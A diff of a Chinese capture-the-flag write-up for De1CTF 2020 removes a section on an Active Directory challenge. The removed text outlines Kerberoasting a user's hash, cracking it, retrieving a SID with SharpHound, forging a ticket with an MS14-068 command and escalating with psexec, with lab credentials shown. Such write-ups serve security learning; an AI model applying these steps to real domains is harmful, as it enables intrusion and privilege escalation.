@@ -38,29 +38,6 @@ shell参考这篇文章：https://www.leavesongs.com/PENETRATION/webshell-withou
 
 ![](https://i.imgur.com/7EpeHuU.png)
 
-### Hard_present_2
-
-赛后复现的题目。
-根据提示，我们首先要弄到De1ta用户的密码，Kerberoasting获得密码hash：b03094996601324646ac223bf30d0d07
-参考：https://blog.csdn.net/qq_18501087/article/details/101593766
-
-本地爆破，得到密码：3f23ea12。
-
-利用SharpHound，获取De1ta的SID：
-S-1-5-21-1806179181-549835139-1294087714-1106
-![](https://i.imgur.com/WMhHmt9.png)
-
-
-MS14-068生成票据并导入。
-
-```bash
-MS14-068.exe -u De1ta@De1CTF2020.lab -p 3f23ea12 -s S-1-5-21-1806179181-549835139-1294087714-1106 -d 192.168.0.12
-```
-
-最后psexec提权即可。
-![](https://i.imgur.com/qMsPwZy.png)
-
-
 
 ### Animal Crossing
 
